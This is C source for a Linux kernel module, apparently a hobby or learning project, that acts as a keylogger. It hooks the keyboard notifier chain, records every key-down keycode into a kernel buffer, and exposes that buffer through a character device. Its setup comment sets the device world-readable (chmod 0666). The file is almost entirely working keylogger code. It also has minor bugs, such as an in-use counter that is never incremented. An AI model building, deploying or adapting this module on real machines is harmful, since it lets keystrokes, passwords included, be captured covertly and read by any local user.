/* keylog - registers to keyboard notifications
 * Creates a device file at the defined major number.
 *
 * After loading, see kernel logs for Major number.
 * Create a dev file and map it to this module's dev.
 * mknod /dev/DEV_NAME c MAJOR 0
 * chmod 0666 /dev/DEV_NAME
 */
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#define SUCCESS 0
#define DEV_NAME "keylog"    // Name as it appears in /proc/devices
#define BUF_LEN 4096

static int Major;
static int in_use = 0;
static int msg_index = 0;
static char msg[BUF_LEN];
static char *msg_ptr;

/* Fill callback structure */
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static struct file_operations fops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release,
};
int key_notify(struct notifier_block *nblock, unsigned long code, void *_param);
static struct notifier_block nb = {
    .notifier_call = key_notify
};


static int __init keylog_init(void)
{
    // Create device file
    Major = register_chrdev(0, DEV_NAME, &fops);
    if (Major < 0) {
        printk(KERN_ALERT "Registering char device failed: %d\n", Major);
        return Major;
    }

    printk(KERN_INFO "Major number %d\n", Major);

    // Register keyboard notifier
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keylog_exit(void)
{
    unregister_chrdev(Major, DEV_NAME);
    unregister_keyboard_notifier(&nb);
    return;
}


/* Called from notify block when a key is pressed.
 */
int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;

    int ret = NOTIFY_OK;

    if (code == KBD_KEYCODE) {
        if (param->down) {
            if (msg_index < BUF_LEN) {
                msg[msg_index++] = param->value;
            }
        }
    }

    return ret;
}

/* Called when a process tries to open the device file.
 */
static int device_open(struct inode *inode, struct file *file)
{
    if (in_use)
        return -EBUSY;

    msg_ptr = msg; // Move buffer pointer to start of buffer
    try_module_get(THIS_MODULE);

    return SUCCESS;
}

/* Called when a process closes the device file.
 */
static int device_release(struct inode *inode, struct file *file)
{
    in_use--;

    module_put(THIS_MODULE);

    return 0;
}

/* Called when a process, which has opened the device file, attempts to read
 * from it.
 */
static ssize_t device_read(struct file *file_ptr, char *buffer,
                           size_t length, loff_t *offset)
{
    int bytes_read = 0;
    if (*msg_ptr == 0)
        return 0;

    while (length && *msg_ptr) {
        /* Buffer is in the user data segment, so "*" assignment won't work.
         * We have to use put_user which copies data from the kernel data
         * segment to the user data segment.
         */
        put_user(*(msg_ptr++), buffer++);

        length--;
        bytes_read++;
    }

    return bytes_read;
}

/* Called when a process tries to write to the device file.
 */
static ssize_t device_write(struct file* file_ptr, const char *buff,
                            size_t len, loff_t *off)
{
    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
    return -EINVAL;
}

module_init(keylog_init);
module_exit(keylog_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Christopher Chin");
MODULE_DESCRIPTION("Prints keyboard events");
